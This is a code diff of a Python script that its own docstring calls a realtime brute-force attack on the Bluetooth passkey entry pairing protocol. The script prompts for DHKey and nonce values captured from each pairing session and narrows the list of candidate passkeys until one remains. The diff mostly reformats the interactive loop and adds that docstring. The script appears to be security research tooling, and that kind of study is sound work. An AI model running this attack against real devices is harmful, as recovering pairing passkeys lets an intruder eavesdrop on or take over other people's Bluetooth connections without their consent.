@@ -1,10 +1,12 @@
+"""This is a realtime working of the brute-force attack on the SM passkey entry protocol. The user needs to
+input DHKey,Na0 and Nb0 values for every SSP session and the obtained r*. The attack displays the list of potential passkeys based
+on the known r* bits."""
+
 import hashlib
 import hmac
 import time
 
 start_time = time.time()
-# For simplicity we are using the passkey to generate r* in every session. However, ideally the attacker must input
-# obtained r* bits for every session.
 """Datasets sample 
 DHkey = "2c31a47b5779809ef44cb5eaaf5c3e43d5f8faad4a8794cb987e9b03745c78dd"
 Na = "356e369e521b0c3b99223ea4ce393024"
@@ -12,6 +14,7 @@ Nb = "3057b5f403616cfa4924ab9e8db98516"
 """
 tmp = 0
 count = 0
+
 
 def firstbrute(dhkey, na, nb, passwords):
     # initialising the values obtained in first SSP session with device A.
@@ -103,23 +106,22 @@ passwords, count = firstbrute(dhkey, na, nb, passwords)
 passwords = passwords[:count]
 tmp = 0.5
 
-
 while count != 1:
-     dhkey = bytes(input("Enter DHkey: "), 'utf-8')
-     na = bytes(input("Enter Na: "), 'utf-8')
-     nb = bytes(input("Enter Nb: "), 'utf-8')
-     print("DHKEY: " + str(dhkey))
-     print("na: " + str(na))
-     print("nb: " + str(nb))
-     passwords, count = conbrute(count, dhkey, na, nb, passwords)
-     passwords = passwords[:count]
-     tmp = tmp + 0.5
-     if count == 0:
-         print("DHKEY error: " + str(dhkey))
-         print("na err: " + str(na))
-         print("nb err: " + str(nb))
-         break
-     print("No. of Potential Passkeys: " + str(len(passwords)))
+    dhkey = bytes(input("Enter DHkey: "), 'utf-8')
+    na = bytes(input("Enter Na: "), 'utf-8')
+    nb = bytes(input("Enter Nb: "), 'utf-8')
+    print("DHKEY: " + str(dhkey))
+    print("na: " + str(na))
+    print("nb: " + str(nb))
+    passwords, count = conbrute(count, dhkey, na, nb, passwords)
+    passwords = passwords[:count]
+    tmp = tmp + 0.5
+    if count == 0:
+        print("DHKEY error: " + str(dhkey))
+        print("na err: " + str(na))
+        print("nb err: " + str(nb))
+        break
+    print("No. of Potential Passkeys: " + str(len(passwords)))
 
 print("Potential passkey list: " + str(passwords))
 print("--- %s seconds ---" % (time.time() - start_time))
